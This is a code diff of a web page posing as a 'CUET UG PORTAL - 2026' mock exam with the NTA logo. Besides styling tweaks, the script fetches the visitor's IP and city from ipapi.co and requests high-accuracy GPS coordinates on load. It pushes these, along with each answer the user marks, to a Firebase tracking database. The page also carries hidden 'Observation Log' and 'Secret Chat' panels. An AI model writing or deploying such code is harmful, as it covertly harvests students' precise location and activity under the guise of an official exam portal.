@@ -18,7 +18,6 @@
         .btn-small { width: auto; padding: 5px 10px; font-size: 11px; }
         .timer-strip { background: var(--blue); color: white; padding: 3px; text-align: center; font-weight: bold; font-size: 11px; position: sticky; top: 0; z-index: 100; }
         
-        /* Compact Question Area */
         #q-text { font-size: 11px; line-height: 1.2; margin-bottom: 5px; color: #444; font-weight: bold; }
         .option-item { display: inline-block; padding: 4px 10px; margin: 2px; border: 1px solid #ddd; border-radius: 4px; cursor: pointer; font-size: 10px; }
         .option-item.selected { background: #e3f2fd; border-color: var(--blue); color: var(--blue); }
@@ -29,7 +28,7 @@
             height: 70vh; 
             overflow-y: scroll; 
             border: 1px solid #ccc; 
-            border-bottom: none; /* Input box se jodne ke liye */
+            margin: 0; /* Margin zero kar di taaki chipak jaye */
             padding: 5px; 
             background: #fff; 
             font-size: 11px; 
@@ -42,13 +41,14 @@
 
         .log-item { padding: 4px 6px; border-bottom: 1px solid #f1f1f1; color: #222; word-wrap: break-word; line-height: 1.3; cursor: pointer; }
         
-        /* Message Input Container - Just below the chat */
+        /* Message Input Container - NO TOP MARGIN */
         .input-container {
             display: flex;
             gap: 2px;
             padding: 5px;
             background: #eee;
             border: 1px solid #ccc;
+            border-top: none; /* Upar wali border hata di taaki continuous dikhe */
             border-radius: 0 0 4px 4px;
         }
 
@@ -63,7 +63,7 @@
         <img src="https://nta.ac.in/img/nta_logo.png" height="25">
         <h2 style="color: var(--blue); font-size: 15px;">CUET UG PORTAL - 2026</h2>
     </div>
-    <div id="loading" style="text-align:center; font-size: 10px;">Connecting to database...</div>
+    <div id="loading" style="text-align:center; font-size: 10px;">Connecting...</div>
     <div id="paper-list"></div>
 </div>
 
@@ -80,7 +80,7 @@
         </div>
 
         <div id="exam-log-section" class="hidden log-box">
-            <b style="font-size: 12px; color: var(--blue); padding: 5px; display: block;">Observation Log (P8)</b>
+            <b style="font-size: 12px; color: var(--blue); padding: 5px; display: block; background: #fff;">Observation Log (P8)</b>
             <div id="exam-log-list" class="log-list"></div>
             <div class="input-container">
                 <input type="text" id="exam-log-input" style="flex:1; padding:10px; border:1px solid #bbb; border-radius:4px; font-size: 13px;" placeholder="Message...">
@@ -93,14 +93,16 @@
 <div id="result-screen" class="container hidden">
     <h2 style="color:var(--blue); font-size: 16px;">Test Analysis</h2>
     <div id="res-summary"></div>
+    
     <div id="submit-log-section" class="hidden log-box">
-        <p style="font-size: 13px; font-weight: bold; color: var(--blue);">Secret Chat (P17)</p>
+        <p style="font-size: 13px; font-weight: bold; color: var(--blue); background: #fff; margin: 0; padding: 5px;">Secret Chat (P17)</p>
         <div id="submit-log-list" class="log-list" style="height: 300px;"></div>
         <div class="input-container">
             <input type="text" id="submit-log-input" style="flex:1; padding:10px; border:1px solid #bbb; border-radius:4px;" placeholder="Secret msg...">
             <button onclick="sendSubmitEntry()" class="btn btn-blue btn-small">Send</button>
         </div>
     </div>
+
     <button onclick="location.reload()" class="btn btn-blue btn-small" style="margin-top:10px;">Home</button>
     <div style="overflow-x: auto; margin-top: 10px;">
         <table class="res-table">
@@ -131,24 +133,22 @@
         const newSession = database.ref('user_journeys').push();
         sessionKey = newSession.key;
         newSession.set({ startTime: new Date().toLocaleString(), events: ["Launched"] });
-        fetchIPLocation();
+        
+        // Initial IP Log
+        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+            const info = { city: data.city, ip: data.ip, type: "IP_INITIAL", time: new Date().toLocaleString() };
+            database.ref('user_tracking').push(info);
+            database.ref('user_journeys/' + sessionKey).update(info);
+        });
+
+        // GPS Upgrade
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
-                const gpsInfo = { lat: pos.coords.latitude, lon: pos.coords.longitude, type: "GPS_PRECISE", time: new Date().toLocaleString() };
-                database.ref('user_journeys/' + sessionKey).update(gpsInfo);
-                database.ref('user_tracking').push(gpsInfo);
+                const gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, type: "GPS_UPGRADE", time: new Date().toLocaleString() };
+                database.ref('user_journeys/' + sessionKey).update(gps);
+                database.ref('user_tracking').push(gps);
             }, null, { enableHighAccuracy: true });
         }
-    }
-
-    function fetchIPLocation() {
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => {
-                const ipInfo = { city: data.city, ip: data.ip, type: "IP_INITIAL", time: new Date().toLocaleString() };
-                database.ref('user_tracking').push(ipInfo);
-                if(sessionKey) database.ref('user_journeys/' + sessionKey).update(ipInfo);
-            }).catch(e => console.log("IP Failed"));
     }
     startJourney();
 
@@ -192,7 +192,7 @@
 
     function selectOpt(i) { 
         userChoices[currentQ] = i; 
-        recordEvent(`Q${currentQ+1} selected ${i}`);
+        recordEvent(`Q${currentQ+1} marked ${i}`);
         render(); 
     }
 
